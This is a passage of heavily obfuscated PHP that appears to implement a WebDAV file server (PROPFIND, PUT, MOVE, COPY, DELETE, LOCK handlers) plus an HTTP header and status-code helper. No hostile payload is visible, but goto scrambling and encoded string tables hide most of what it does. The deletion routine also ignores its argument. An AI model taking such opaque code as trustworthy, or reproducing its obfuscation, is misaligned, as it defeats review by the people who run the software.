else { $C´ä»ƒÓÍ∞ = $this->{$Açêç∂óîé}(); } goto BÃ ‘á‚ õ; Eë…‡‚üµè: } public function pathGet($D°áéœ¥£Ï = false) { $DÑ‚í‡≈àõ =& $_SERVER[¯èãÄπµ]; $B„êÍ≈ú•Ì = $D°áéœ¥£Ï ? $_SERVER[$DÑ‚í‡≈àõ[1772]] : $_SERVER[$DÑ‚í‡≈àõ[1375]]; $B„êÍ≈ú•Ì = KodIO::clear(rawurldecode($B„êÍ≈ú•Ì)); if (!strstr($B„êÍ≈ú•Ì, KodIO::clear($this->urlBase))) { return !1; } return substr($B„êÍ≈ú•Ì, strpos($B„êÍ≈ú•Ì, $this->urlBase) + strlen($this->urlBase)); } public function pathExists($DÇ¥Ã—ﬁ◊Ü) { return file_exists($DÇ¥Ã—ﬁ◊Ü); } public function pathMkdir($B‹∏ÉüçÈ) { return mkdir($B‹∏ÉüçÈ, 511, !0); } public function pathInfo($CıµåŸ£ÎŸ) { return path_info($CıµåŸ£ÎŸ); } public function pathList($Fÿ‘í‚ÛÉå) { return path_list($Fÿ‘í‚ÛÉå); } public function pathOut($EÓ„…¡ÃÕ‡) { echo file_get_contents($EÓ„…¡ÃÕ‡); } public function pathPut($fßı¬≤¥Á°, $cΩçˆ˘–•À = '') { if (!$cΩçˆ˘–•À) { return file_put_contents($fßı¬≤¥Á°, $_SERVER[¯èãÄπµ][33]); } return move_path($cΩçˆ˘–•À, $fßı¬≤¥Á°); } public function pathRemove($b» ÉÉâè–) { if (is_file($b» ÉÉâè–)) { return @unlink($this->path); } else { return del_dir($this->path); } } public function pathMove($CíäıûÊ«≈, $Cßº—¯€á∑) { return move_path($CíäıûÊ«≈, $Cßº—¯€á∑); } public function pathCopy($aÔùÙ·æåµ, $aÏ¥—ƒèû¿) { return copy_dir($aÔùÙ·æåµ, $aÏ¥—ƒèû¿); } public function parsePath($a‡ıπ™ÑóÒ) { return $a‡ıπ™ÑóÒ; } public function parseItem($CÓÌÍÌ√ËÛ, $AêÑ¶ÑÕÆ) { goto Dı∆íÔçÌÍ; BÇ‰„Âä∑®: $c¥Œ™ÇôﬁË = array($bÿ´∆ˆàäÇ[1773] => KodIO::clear($this->urlBase . $DÌå∂‹ö¬ú), $bÿ´∆ˆàäÇ[106] => @gmdate($bÿ´∆ˆàäÇ[1774], $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[106]]), $bÿ´∆ˆàäÇ[183] => @gmdate($bÿ´∆ˆàäÇ[1775], $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[183]]), $bÿ´∆ˆàäÇ[77] => $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[77]] ? $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[77]] : 0); return $c¥Œ™ÇôﬁË; goto fõı˘„¨‚ƒ; bª´Àüî¥√: if ($AêÑ¶ÑÕÆ) { $DÌå∂‹ö¬ú = $bÿ´∆ˆàäÇ[8] . str_replace($bÿ´∆ˆàäÇ[168], $bÿ´∆ˆàäÇ[8], rawurlencode($this->pathGet())); } if (!trim($CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[106]])) { $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[106]] = time(); } if (!trim($CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[183]])) { $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[183]] = time(); } goto BÇ‰„Âä∑®; Dı∆íÔçÌÍ: $bÿ´∆ˆàäÇ =& $_SERVER[¯èãÄπµ]; $DÌå∂‹ö¬ú = $this->pathGet() . $bÿ´∆ˆàäÇ[8] . $CÓÌÍÌ√ËÛ[$bÿ´∆ˆàäÇ[28]]; $DÌå∂‹ö¬ú = $bÿ´∆ˆàäÇ[8] . str_replace($bÿ´∆ˆàäÇ[168], $bÿ´∆ˆàäÇ[8], rawurlencode($DÌå∂‹ö¬ú)); goto bª´Àüî¥√; fõı˘„¨‚ƒ: } public function parseItemXml($Båã·›÷Ã∂, $d¥ıïÆÓ≥Ω) { $dÉ¢»£ìéº =& $_SERVER[¯èãÄπµ]; $AÔ”€ùµÿä = $this->parseItem($Båã·›÷Ã∂, $d¥ıïÆÓ≥Ω); if ($Båã·›÷Ã∂[$dÉ¢»£ìéº[29]] == $dÉ¢»£ìéº[76]) { $B°é™à”á’ = $dÉ¢»£ìéº[1776]; $B°é™à”á’ .= $dÉ¢»£ìéº[1777]; } else { $AÒã €úÃ© = $Båã·›÷Ã∂[$dÉ¢»£ìéº[156]] ? $Båã·›÷Ã∂[$dÉ¢»£ìéº[156]] : get_path_ext($Båã·›÷Ã∂[$dÉ¢»£ìéº[28]]); $CπÉü´æ≠© = get_file_mime($AÒã €úÃ©); $B°é™à”á’ = $dÉ¢»£ìéº[1778]; $B°é™à”á’ .= "\x3c\x44\72\147\x65\164\143\x6f\156\164\145\156\164\164\171\x70\x65\x3e{$CπÉü´æ≠©}\74\57\104\72\147\x65\164\x63\x6f\x6e\164\145\x6e\164\164\x79\160\145\76"; } return "\12\x9\11\x3c\104\x3a\x72\145\x73\x70\157\156\163\x65\76\xa\11\x9\11\x3c\104\72\150\162\x65\x66\76{$AÔ”€ùµÿä[$dÉ¢»£ìéº[1773]]}\x3c\x2f\104\x3a\x68\162\145\x66\76\12\11\11\x9\x3c\104\x3a\x70\x72\157\x70\163\164\x61\x74\76\xa\11\x9\11\11\74\104\x3a\160\x72\157\x70\76\xa\x9\11\11\11\11\x3c\x44\x3a\x67\x65\164\x6c\x61\x73\164\x6d\x6f\x64\151\146\x69\145\144\76{$AÔ”€ùµÿä[$dÉ¢»£ìéº[106]]}\x3c\57\x44\x3a\147\145\164\x6c\x61\x73\x74\155\x6f\x64\151\146\151\145\144\76\12\11\x9\x9\11\11\74\104\x3a\143\x72\145\141\164\151\157\156\x64\141\x74\145\76{$AÔ”€ùµÿä[$dÉ¢»£ìéº[183]]}\x3c\57\x44\x3a\x63\x72\145\x61\164\x69\x6f\x6e\x64\x61\x74\x65\76\12\x9\11\11\x9\x9\x3c\104\x3a\147\145\164\x63\157\156\164\x65\156\164\154\x65\x6e\x67\x74\x68\x3e{$AÔ”€ùµÿä[$dÉ¢»£ìéº[77]]}\x3c\x2f\x44\x3a\x67\x65\164\x63\x6f\156\x74\x65\156\164\154\x65\x6e\147\164\150\76\xa\x9\11\x9\11\x9{$B°é™à”á’}\xa\11\11\11\x9\74\x2f\x44\x3a\x70\162\157\x70\76\xa\x9\11\11\11\74\x44\72\163\164\x61\x74\165\x73\76\110\x54\x54\x50\x2f\61\56\61\x20\62\x30\60\40\117\x4b\74\x2f\x44\x3a\x73\164\x61\164\165\163\x3e\12\x9\11\x9\74\57\x44\x3a\160\162\157\x70\x73\x74\x61\x74\x3e\xa\x9\11\x3c\x2f\104\x3a\x72\145\163\x70\x6f\x6e\163\x65\x3e"; } public function pathListMerge($aì…£›¡œÒ) { goto aÊà§ˆæÃË; b∞Àç˘ÀÉ: $d∆ïä·Ò…– = array(); foreach ($aì…£›¡œÒ as $fùå¢©øá∑ => $aËﬁ‡»Îä∆) { if (!in_array($fùå¢©øá∑, $a»ﬁ‡æ«àé) || !is_array($aËﬁ‡»Îä∆)) { continue; } $d∆ïä·Ò…– = array_merge($d∆ïä·Ò…–, $aËﬁ‡»Îä∆); } foreach ($d∆ïä·Ò…– as &$c⁄îÜœù¶¯) { $c⁄îÜœù¶¯[$C€•∂‹åÛâ[28]] = str_replace($C€•∂‹åÛâ[8], $C€•∂‹åÛâ[1377], $c⁄îÜœù¶¯[$C€•∂‹åÛâ[28]]); } goto Fı§˜ˆ¶ç£; aÊà§ˆæÃË: $C€•∂‹åÛâ =& $_SERVER[¯èãÄπµ]; if (!$aì…£›¡œÒ) { return $aì…£›¡œÒ; } $a»ﬁ‡æ«àé = array($C€•∂‹åÛâ[73], $C€•∂‹åÛâ[74], $C€•∂‹åÛâ[1779]); goto b∞Àç˘ÀÉ; Fı§˜ˆ¶ç£: return $d∆ïä·Ò…–; goto b◊õ©úµµã; b◊õ©úµµã: } public function httpPROPFIND() { goto Aì≥ûùŒß⁄; Aì≥ûùŒß⁄: $eßËõŒê¥≤ =& $_SERVER[¯èãÄπµ]; $Dî¥á’·◊  = $this->pathList($this->path); $aÜíÊÕõØ‘ = $this->pathListMerge($Dî¥á’·◊ ); goto dÓ¨Œ”§÷ä; dÓ¨Œ”§÷ä: $bë˜ì›ÑóÉ = $Dî¥á’·◊ [$eßËõŒê¥≤[1780]]; if (!is_array($aÜíÊÕõØ‘) || $bë˜ì›ÑóÉ[$eßËõŒê¥≤[1781]] === !1) { return array($eßËõŒê¥≤[1782] => 404, $eßËõŒê¥≤[1783] => $eßËõŒê¥≤[1784]); } $Aê›¬Ü¿ıª = $bë˜ì›ÑóÉ[$eßËõŒê¥≤[29]] == $eßËõŒê¥≤[163] || HttpHeader::get($eßËõŒê¥≤[1759]) == $eßËõŒê¥≤[464]; goto aüö≈∞èñÇ; aüö≈∞èñÇ: if ($Aê›¬Ü¿ıª) { $aÜíÊÕõØ‘ = array($bë˜ì›ÑóÉ); } else { $bë˜ì›ÑóÉ[$eßËõŒê¥≤[28]] = $eßËõŒê¥≤[33]; $aÜíÊÕõØ‘ = array_merge(array($bë˜ì›ÑóÉ), $aÜíÊÕõØ‘); } $bõ—çãà˜ = $eßËõŒê¥≤[33]; foreach ($aÜíÊÕõØ‘ as $cØ —ªΩÛÊ) { $bõ—çãà˜ .= $this->parseItemXml($cØ —ªΩÛÊ, $Aê›¬Ü¿ıª); } goto F¬âêœ∑„ö; F¬âêœ∑„ö: return array($eßËõŒê¥≤[1782] => 207, $eßËõŒê¥≤[1783] => "\x3c\x44\72\155\x75\x6c\x74\x69\163\164\x61\164\165\163\40\x78\155\x6c\156\x73\72\104\75\x22\x44\101\x56\72\x22\76\xa{$bõ—çãà˜}\xa\74\x2f\x44\72\x6d\165\x6c\164\x69\x73\x74\x61\164\x75\163\x3e"); goto a…¬ò„¥‹π; a…¬ò„¥‹π: } public function httpHEAD() { $Eﬂäêå·ú‚ =& $_SERVER[¯èãÄπµ]; $d∂†±˜√ÛÉ = $this->pathInfo($this->path); if (!$d∂†±˜√ÛÉ || $d∂†±˜√ÛÉ[$Eﬂäêå·ú‚[29]] == $Eﬂäêå·ú‚[76]) { return array($Eﬂäêå·ú‚[1034] => 200, $Eﬂäêå·ú‚[1203] => array($Eﬂäêå·ú‚[1785])); } return array($Eﬂäêå·ú‚[1034] => 200, $Eﬂäêå·ú‚[1203] => array($Eﬂäêå·ú‚[1786], $Eﬂäêå·ú‚[135], $Eﬂäêå·ú‚[1787] . $d∂†±˜√ÛÉ[$Eﬂäêå·ú‚[77]], $Eﬂäêå·ú‚[1788] . get_file_mime($d∂†±˜√ÛÉ[$Eﬂäêå·ú‚[156]]), $Eﬂäêå·ú‚[131] . gmdate($Eﬂäêå·ú‚[1774], $d∂†±˜√ÛÉ[$Eﬂäêå·ú‚[1250]]) . $Eﬂäêå·ú‚[1789], $Eﬂäêå·ú‚[1790])); } public function httpOPTIONS() { $A™‹”‘⁄≤÷ =& $_SERVER[¯èãÄπµ]; return array($A™‹”‘⁄≤÷[1034] => 200, $A™‹”‘⁄≤÷[1203] => array($A™‹”‘⁄≤÷[1791], $A™‹”‘⁄≤÷[1792], $A™‹”‘⁄≤÷[1793], $A™‹”‘⁄≤÷[1259])); } public function httpPROPPATCH() { $E“∂·´Õä‡ =& $_SERVER[¯èãÄπµ]; $b»ßÚôﬂÓ¢ = $E“∂·´Õä‡[1794] . $_SERVER[$E“∂·´Õä‡[1375]] . $E“∂·´Õä‡[1795]; return array($E“∂·´Õä‡[1782] => 207, $E“∂·´Õä‡[1783] => "\x3c\x44\72\155\165\x6c\x74\151\163\x74\x61\x74\165\163\x20\x78\x6d\154\x6e\x73\x3a\x44\75\x22\x44\x41\126\72\x22\76\12{$b»ßÚôﬂÓ¢}\12\74\x2f\104\72\x6d\165\154\164\151\163\x74\x61\x74\x75\x73\76"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $B§≠¡∫ùóŸ =& $_SERVER[¯èãÄπµ]; $eÁø°»∫≈” = $this->uploadFile(); if ($eÁø°»∫≈”) { $EÊﬂ¨€áÏÎ = 204; } else { $eÁø°»∫≈” = $B§≠¡∫ùóŸ[33]; $EÊﬂ¨€áÏÎ = 201; } $A¬¡á„·Æ = $this->pathPut($this->path, $eÁø°»∫≈”); if ($A¬¡á„·Æ == !1) { $EÊﬂ¨€áÏÎ = 404; } return array($B§≠¡∫ùóŸ[1782] => $EÊﬂ¨€áÏÎ); } private function uploadFile() { goto eî‰æò‹Œﬁ; D™ÖèñÖÚﬁ: if (@filesize($f¬üÜçº°®) > 0) { return $f¬üÜçº°®; } @unlink($f¬üÜçº°®); return !1; goto eê‰ÀÍ’ê∞; aãã∑“æ“Í: $dÿ≠ «èä˘ = @fopen($f¬üÜçº°®, $fªâÂó”á¢[1504]); $B·µé«¿ë≠ = @fopen($fªâÂó”á¢[1797], $fªâÂó”á¢[1503]); if (!$B·µé«¿ë≠ || !$dÿ≠ «èä˘) { @unlink($f¬üÜçº°®); return !1; } goto D‹É”ﬁÍôÖ; eî‰æò‹Œﬁ: $fªâÂó”á¢ =& $_SERVER[¯èãÄπµ]; @mk_dir(TEMP_FILES); $f¬üÜçº°® = TEMP_FILES . $fªâÂó”á¢[1796] . rand_string(32); goto aãã∑“æ“Í; D‹É”ﬁÍôÖ: while (!feof($B·µé«¿ë≠)) { fwrite($dÿ≠ «èä˘, fread($B·µé«¿ë≠, 1024 * 200)); } fclose($B·µé«¿ë≠); fclose($dÿ≠ «èä˘); goto D™ÖèñÖÚﬁ; eê‰ÀÍ’ê∞: } public function httpMKCOL() { $D˘Ãﬂ®¢çÓ =& $_SERVER[¯èãÄπµ]; if ($this->pathExists($this->path)) { return array($D˘Ãﬂ®¢çÓ[1034] => 409); } $dà€á—õãÒ = $this->pathMkdir($this->path); return array($D˘Ãﬂ®¢çÓ[1034] => $dà€á—õãÒ ? 201 : 403); } public function httpMOVE() { $b„ÿÃŸáΩû =& $_SERVER[¯èãÄπµ]; $a†◊ÎÎÁõ≥ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$b„ÿÃŸáΩû[1798]])) { $Bô¢›÷óËä[$b„ÿÃŸáΩû[1799]] = $_SERVER[$b„ÿÃŸáΩû[1798]] == $b„ÿÃŸáΩû[1800]; } $CêàÇ≠Œ™Ë = $this->pathMove($this->path, $a†◊ÎÎÁõ≥); return array($b„ÿÃŸáΩû[1034] => $CêàÇ≠Œ™Ë ? 201 : 404); } public function httpCOPY() { $BƒÇÏôÌ”ø = $this->parsePath($this->pathGet(!0)); $aáùØ⁄àü∑ = $this->pathCopy($this->path, $BƒÇÏôÌ”ø); return array($_SERVER[¯èãÄπµ][1034] => $aáùØ⁄àü∑ ? 201 : 404); } public function httpDELETE() { $BÆç°–ÿ¢» = $this->pathRemove($this->path); return array($_SERVER[¯èãÄπµ][1034] => $BÆç°–ÿ¢» ? 200 : 503); } public function httpLOCK() { $a”ÕÆá¨Ù„ =& $_SERVER[¯èãÄπµ]; $AµÛŸ·∫◊Ê = md5($this->path); $Aåÿâ‘Úö = $a”ÕÆá¨Ù„[1801] . $this->xmlGet($a”ÕÆá¨Ù„[1802]) . $a”ÕÆá¨Ù„[1803] . $AµÛŸ·∫◊Ê . $a”ÕÆá¨Ù„[1804]; return array($a”ÕÆá¨Ù„[1034] => 200, $a”ÕÆá¨Ù„[1203] => array($a”ÕÆá¨Ù„[1805] . $AµÛŸ·∫◊Ê, $a”ÕÆá¨Ù„[1806]), $a”ÕÆá¨Ù„[1807] => $Aåÿâ‘Úö); } public function httpUNLOCK() { return array($_SERVER[¯èãÄπµ][1034] => 204); } public function xmlGet($A›ÜﬁÈ‡Ñ›) { goto F≈ñúπÜØ‹; e∞Æ≈Œ∏â‘: return $D™ØÈãü°’[33]; goto Béƒªœ≈–å; eÏÜˆ¥πƒ—: $FÌ≥ë∏õëﬂ = array_shift(explode($D™ØÈãü°’[8], $A›ÜﬁÈ‡Ñ›)); $aÉøÉ¬‰Ö∂ = $cñØ¢Ω⁄ëÓ->getElementsByTagNameNS($D™ØÈãü°’[1809], $FÌ≥ë∏õëﬂ); if ($aÉøÉ¬‰Ö∂) { return $aÉøÉ¬‰Ö∂[0]->nodeValue; } goto e∞Æ≈Œ∏â‘; F≈ñúπÜØ‹: $D™ØÈãü°’ =& $_SERVER[¯èãÄπµ]; static $cñØ¢Ω⁄ëÓ = false; if (!$cñØ¢Ω⁄ëÓ) { $F¢ñãõßçÜ = file_get_contents($D™ØÈãü°’[1808]); $cñØ¢Ω⁄ëÓ = new DOMDocument(); $cñØ¢Ω⁄ëÓ->loadXML($F¢ñãõßçÜ); } goto eÏÜˆ¥πƒ—; Béƒªœ≈–å: } public static function response($béØËƒÚÍÌ) { goto fÇ·ëÖ∏ªŒ; aŸÎûçÿàà: $Bææ√¯°¡å[] = $c⁄ßéÁÁçä[1749]; $Bææ√¯°¡å[] = $c⁄ßéÁÁçä[1750]; foreach ($Bææ√¯°¡å as $bÌêôø„ù) { header($bÌêôø„ù); } goto eÕ£ö±óØî; fÇ·ëÖ∏ªŒ: $c⁄ßéÁÁçä =& $_SERVER[¯èãÄπµ]; $Bææ√¯°¡å = is_array($béØËƒÚÍÌ[$c⁄ßéÁÁçä[1203]]) ? $béØËƒÚÍÌ[$c⁄ßéÁÁçä[1203]] : array(); $Bææ√¯°¡å[] = HttpHeader::code($béØËƒÚÍÌ[$c⁄ßéÁÁçä[1034]]); goto aŸÎûçÿàà; eÕ£ö±óØî: if (is_string($béØËƒÚÍÌ[$c⁄ßéÁÁçä[1807]])) { header($c⁄ßéÁÁçä[1810]); $côˆ˘ΩÛëÒ = $c⁄ßéÁÁçä[1811] . $c⁄ßéÁÁçä[213] . $béØËƒÚÍÌ[$c⁄ßéÁÁçä[1807]]; echo $côˆ˘ΩÛëÒ; } goto F»⁄ãﬂ’∑; F»⁄ãﬂ’∑: } } goto DÌíû¬ïï◊; DÌíû¬ïï◊: class HttpHeader { public static $_headers = array("\x48\x6f\x73\x74" => "\x48\x54\x54\x50\x5f\110\117\x53\x54", "\125\x73\x65\162\55\101\x67\x65\x6e\x74" => "\x48\124\124\120\137\125\123\x45\122\x5f\101\x47\x45\116\124", "\103\x6f\156\164\145\x6e\x74\x2d\124\x79\160\145" => "\x48\124\124\120\x5f\x43\117\116\x54\105\116\x54\x5f\124\x59\x50\105", "\103\157\156\164\x65\x6e\164\55\x4c\x65\x6e\147\x74\x68" => "\110\124\x54\120\x5f\103\117\x4e\x54\105\116\x54\x5f\114\x45\116\107\x54\x48", "\104\x65\x70\164\x68" => "\x48\124\124\x50\x5f\104\x45\120\x54\x48", "\105\x78\x70\x65\x63\x74" => "\110\124\x54\x50\x5f\105\x58\x50\105\103\124", "\x49\x66\x2d\x4e\157\x6e\x65\x2d\115\141\x74\x63\150" => "\110\124\124\120\137\x49\x46\137\x4e\117\116\x45\137\x4d\101\124\x43\110", "\x49\146\55\x4d\141\x74\143\x68" => "\110\x54\x54\x50\x5f\x49\106\137\x4d\x41\x54\103\110", "\111\146\x2d\122\141\x6e\x67\145" => "\x48\124\x54\x50\x5f\x49\106\x5f\x52\x41\x4e\x47\105", "\114\141\x73\164\55\115\x6f\144\x69\x66\x69\x65\x64" => "\x48\124\124\120\137\x4c\101\x53\124\137\115\x4f\x44\x49\106\111\105\104", "\x49\146\x2d\x4d\x6f\x64\x69\146\x69\145\x64\x2d\123\x69\x6e\x63\145" => "\x48\124\x54\120\x5f\111\106\137\115\117\x44\111\x46\111\x45\104\x5f\x53\111\x4e\x43\105", "\111\146\x2d\x55\x6e\155\157\144\x69\x66\151\145\144\x2d\x53\x69\156\x63\145" => "\110\x54\124\120\137\x49\106\x5f\x55\116\115\x4f\x44\x49\x46\x49\x45\104\x5f\x53\x49\x4e\103\105", "\122\141\x6e\147\145" => "\x48\x54\124\x50\x5f\122\x41\x4e\x47\x45", "\x54\x69\155\x65\157\165\164" => "\x48\124\124\120\137\124\x49\x4d\x45\117\125\124", "\x49\146" => "\x48\x54\124\120\137\x49\106", "\114\x6f\x63\153\x2d\x54\157\x6b\145\x6e" => "\110\124\124\120\137\x4c\117\103\x4b\137\124\117\113\x45\116", "\117\x76\145\x72\167\162\x69\164\145" => "\110\x54\124\x50\137\x4f\x56\x45\x52\127\122\x49\124\105", "\104\145\x73\x74\x69\x6e\x61\164\x69\x6f\x6e" => "\x48\x54\124\120\x5f\104\x45\123\x54\111\116\101\124\x49\117\116", "\x52\x65\x71\165\145\163\x74\x2d\x49\144" => "\122\105\121\x55\x45\x53\x54\137\111\104", "\122\x65\161\x75\x65\163\x74\55\x42\x6f\144\x79\55\106\151\154\x65" => "\x52\x45\x51\x55\105\x53\124\137\x42\x4f\104\131\137\x46\111\x4c\105", "\x52\145\144\151\x72\145\x63\164\x2d\x53\164\x61\164\x75\x73" => "\x52\105\x44\x49\122\105\103\124\137\123\x54\x41\124\x55\123"); public static function init() { static $dﬂ≤œä¢µ“ = false; if ($dﬂ≤œä¢µ“) { return; } foreach ($_SERVER as $fê©ˆ‘äØÖ => $eﬁêûãï≤Ω) { $fê©ˆ‘äØÖ = strtoupper($fê©ˆ‘äØÖ); if (!array_key_exists($fê©ˆ‘äØÖ, $_SERVER)) { continue; } $_SERVER[$fê©ˆ‘äØÖ] = $eﬁêûãï≤Ω; } foreach (self::$_headers as $fê©ˆ‘äØÖ => $eó…œÊ≠„Û) { if (!array_key_exists($fê©ˆ‘äØÖ, $_SERVER)) { continue; } $_SERVER[$fê©ˆ‘äØÖ] = $_SERVER[$eó…œÊ≠„Û]; $_SERVER[strtoupper($fê©ˆ‘äØÖ)] = $_SERVER[$eó…œÊ≠„Û]; } } public static function get($eÜ Áˆπª) { self::init(); return $_SERVER[$eÜ Áˆπª] ? $_SERVER[$eÜ Áˆπª] : $_SERVER[$_SERVER[¯èãÄπµ][1812] . strtoupper($eÜ Áˆπª)]; } public static function method() { return strtoupper(self::get($_SERVER[¯èãÄπµ][150])); } public static function length() { $fÔü‘ã§§µ =& $_SERVER[¯èãÄπµ]; $f°ãÉ®ÿ™Ô = self::get($fÔü‘ã§§µ[1813]); if (!$f°ãÉ®ÿ™Ô) { $f°ãÉ®ÿ™Ô = self::get($fÔü‘ã§§µ[1140]); } return $f°ãÉ®ÿ™Ô; } public static function range() { $C‘Íåë®“ª =& $_SERVER[¯èãÄπµ]; $CÂóüÓ÷ÓÇ = self::get($C‘Íåë®“ª[194]); if (!$CÂóüÓ÷ÓÇ) { return !1; } if (!preg_match($C‘Íåë®“ª[1814], $CÂóüÓ÷ÓÇ, $dÑ∞ù¬éÇÙ)) { return !1; } if ($dÑ∞ù¬éÇÙ[1] === $C‘Íåë®“ª[33] && $dÑ∞ù¬éÇÙ[2] === $C‘Íåë®“ª[33]) { return !1; } return array($dÑ∞ù¬éÇÙ[1] !== $C‘Íåë®“ª[33] ? $dÑ∞ù¬éÇÙ[1] : null, $dÑ∞ù¬éÇÙ[2] !== $C‘Íåë®“ª[33] ? $dÑ∞ù¬éÇÙ[2] : null); } public static $statusCode = array("\61\60\x30" => "\103\157\156\x74\x69\x6e\x75\145", "\61\x30\61" => "\x53\x77\x69\x74\x63\x68\151\x6e\147\40\x50\162\x6f\x74\x6f\143\x6f\154", "\61\60\62" => "\x50\162\x6f\x63\145\x73\x73\151\x6e\147", "\61\60\x33" => "\x45\141\162\154\x79\40\110\151\156\x74\x73", "\62\60\60" => "\117\113", "\x32\x30\x31" => "\x43\x72\x65\141\x74\145\144", "\x32\60\62" => "\x41\x63\x63\x65\x70\164\x65\x64", "\62\x30\63" => "\x4e\x6f\x6e\x2d\101\165\x74\x68\x6f\162\151\164\141\x74\x69\166\145\40\111\156\146\157\x72\155\141\164\151\x6f\156", "\62\60\64" => "\x4e\157\x20\103\x6f\x6e\x74\x65\x6e\164", "\x32\x30\65" => "\x52\x65\163\145\x74\40\x43\157\156\164\145\x6e\164", "\62\x30\x36" => "\120\x61\162\164\x69\x61\154\x20\103\157\x6e\x74\x65\x6e\x74", "\62\60\x37" => "\x4d\165\x6c\x74\x69\x2d\123\164\141\164\x75\x73", "\x33\60\x30" => "\x4d\165\154\x74\x69\x70\x6c\145\40\x43\150\157\151\143\x65\163", "\63\60\x31" => "\x4d\x6f\x76\145\x64\x20\x50\x65\x72\155\141\x6e\145\156\x74\154\x79", "\63\x30\62" => "\x46\x6f\165\156\x64", "\63\60\x33" => "\123\x65\x65\40\117\x74\150\145\x72", "\x33\60\x34" => "\116\x6f\164\40\115\x6f\144\x69\146\151\x65\x64", "\x33\60\65" => "\125\163\x65\x20\120\x72\x6f\170\171", "\63\60\67" => "\x54\145\155\160\x6f\x72\x61\x72\171\40\x52\x65\144\151\162\x65\x63\x74", "\63\x30\x38" => "\120\145\162\155\141\156\145\x6e\x74\x20\122\145\x64\x69\162\145\x63\x74", "\x34\60\60" => "\x42\141\144\x20\122\145\x71\x75\145\163\x74", "\64\60\61" => "\125\156\141\165\164\150\x6f\162\151\x7a\x65\144", "\x34\60\x32" => "\x50\141\171\x6d\145\156\x74\x20\x52\x65\161\165\151\x72\x65\x64", "\x34\60\63" => "\106\x6f\162\x62\x69\x64\144\145\156", "\64\60\64" => "\116\x6f\164\x20\x46\157\165\x6e\x64", "\x34\60\65" => "\x4d\x65\164\150\x6f\x64\40\x4e\157\164\x20\x41\154\154\x6f\x77\145\x64", "\x34\60\x36" => "\x4e\x6f\x74\x20\101\143\143\x65\160\164\141\142\154\145", "\64\60\67" => "\x50\x72\157\x78\171\x20\x41\165\164\150\x65\156\x74\x69\x63\141\164\151\157\156\40\122\x65\x71\x75\x69\x72\145\144", "\x34\x30\x38" => "\122\145\x71\x75\145\163\164\40\x54\151\155\145\x6f\x75\164", "\x34\x30\71" => "\103\157\156\x66\x6c\x69\x63\164", "\64\61\60" => "\107\x6f\x6e\x65", "\64\x31\61" => "\114\x65\x6e\x67\x74\150\40\x52\145\161\x75\151\162\x65\144", "\64\x31\x32" => "\120\x72\x65\143\157\x6e\144\x69\x74\x69\157\156\40\106\141\151\x6c\x65\144", "\64\x31\x33" => "\x52\145\x71\x75\x65\x73\164\40\x45\x6e\x74\151\x74\171\40\124\x6f\x6f\40\x4c\x61\162\x67\145", "\x34\x31\x34" => "\x52\145\161\x75\x65\163\x74\40\125\122\x49\x20\124\157\157\x20\x4c\x61\x72\x67\145", "\x34\x31\x35" => "\125\x6e\x73\165\160\x70\157\162\164\145\144\40\x4d\x65\144\151\x61\40\x54\x79\160\145", "\x34\x31\66" => "\x52\x65\161\165\x65\163\x74\145\144\40\122\x61\156\x67\x65\x20\x4e\x6f\x74\40\x53\141\164\151\x73\x66\151\141\x62\x6c\145", "\64\x31\x37" => "\105\170\x70\145\143\x74\x61\164\151\157\x6e\40\106\x61\151\x6c\x65\x64", "\x34\x32\x32" => "\x55\156\x70\162\x6f\x63\x65\x73\x73\x61\x62\x6c\x65\40\105\x6e\x74\x69\164\x79", "\64\62\x33" => "\x4c\x6f\x63\x6b\145\144", "\x34\x32\x34" => "\x46\x61\151\x6c\145\144\x20\x44\145\x70\145\x6e\x64\145\156\x63\x79", "\x34\62\65" => "\125\x6e\157\162\144\145\x72\145\x64\40\103\157\x6c\154\145\143\x74\x69\157\156", "\x34\x32\66" => "\125\160\x67\162\141\144\145\x20\x52\x65\161\x75\151\162\x65\144", "\64\x32\70" => "\x50\162\145\x63\x6f\156\x64\151\164\151\157\x6e\40\122\145\x71\x75\151\162\145\x64", "\x34\x32\x39" => "\124\157\157\40\115\x61\156\x79\x20\122\x65\161\x75\145\x73\x74\163", "\64\x33\61" => "\x52\x65\161\x75\x65\x73\164\40\x48\x65\x61\144\145\162\x20\x46\x69\145\x6c\144\163\40\x54\x6f\x6f\x20\x4c\x61\162\x67\x65", "\64\x34\64" => "\116\x6f\x20\122\x65\x73\160\157\156\x73\145", "\x34\65\60" => "\102\154\x6f\x63\x6b\x65\144\x20\x62\171\x20\x57\x69\156\144\157\167\x73\x20\x50\x61\162\x65\156\164\141\x6c\x20\x43\157\156\164\162\x6f\154\163", "\x34\x35\x31" => "\x55\156\x61\166\x61\151\154\141\x62\154\x65\x20\x46\157\x72\40\x4c\x65\147\x61\x6c\x20\122\145\141\163\x6f\x6e\163", "\x34\x39\64" => "\x52\x65\x71\165\145\163\164\x20\110\x65\x61\144\x65\x72\x20\124\x6f\157\40\x4c\x61\162\x67\145", "\65\60\x30" => "\111\156\x74\145\x72\156\141\154\x20\123\x65\x72\166\x65\x72\x20\x45\x72\x72\x6f\x72", "\65\60\x31" => "\x4e\x6f\164\x20\111\x6d\x70\x6c\x65\155\x65\x6e\164\x65\144", "\65\x30\62" => "\102\x61\x64\40\x47\x61\164\145\167\141\171", "\65\60\x33" => "\123\145\162\x76\x69\143\x65\x20\125\x6e\141\x76\141\151\x6c\x61\142\x6c\145", "\65\x30\64" => "\x47\141\164\145\167\x61\x79\x20\x54\151\155\145\157\165\x74", "\65\x30\65" => "\x48\124\x54\120\x20\126\x65\x72\x73\x69\x6f\156\40\x6e\157\x74\40\163\x75\160\160\x6f\162\x74\x65\x64", "\65\x30\67" => "\111\156\163\165\x66\146\x69\143\x69\145\156\x74\x20\x53\164\x6f\162\141\147\145"); public static function code($B“Ÿ©ÙóØÖ) { $Cì‘≈µÃ®’ =& $_SERVER[¯èãÄπµ]; $B“Ÿ©ÙóØÖ = $B“Ÿ©ÙóØÖ . $Cì‘≈µÃ®’[33]; $Fú˘ŒÀ÷úê = self::$statusCode[$B“Ÿ©ÙóØÖ]; 